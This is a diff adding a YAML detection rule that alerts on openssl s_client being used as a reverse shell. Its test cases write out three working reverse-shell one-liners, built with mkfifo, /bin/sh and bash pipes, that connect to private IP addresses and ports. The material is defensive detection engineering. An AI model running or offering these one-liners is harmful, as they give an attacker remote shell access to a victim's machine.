@@ -1,0 +1,30 @@
+name: rta_openssl_reverse_shell
+mode: alert
+eval: |
+  (
+    e.process_name == "openssl" &&
+    re_match(e.process_args, "s_client") &&
+    re_match(e.process_args, "-connect\\s+[0-9.]+:[0-9]+") &&
+    (
+      re_match(e.process_args, "mkfifo") ||
+      re_match(e.process_args, "/bin/(sh|bash)") ||
+      re_match(e.process_args, "\\|")
+    )
+  )
+tests:
+  - cleartext: "openssl s_client reverse shell with mkfifo"
+    process_name: openssl
+    process_args: "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -connect 10.10.10.10:4444 > /tmp/s"
+    should_match: true
+  - cleartext: "openssl TLS shell with quiet mode"
+    process_name: openssl
+    process_args: "openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash"
+    should_match: true
+  - cleartext: "openssl reverse shell pipe"
+    process_name: openssl
+    process_args: "/bin/sh | openssl s_client -connect 10.0.0.1:443"
+    should_match: true
+  - cleartext: "normal openssl certificate check"
+    process_name: openssl
+    process_args: "openssl s_client -connect google.com:443"
+    should_match: false
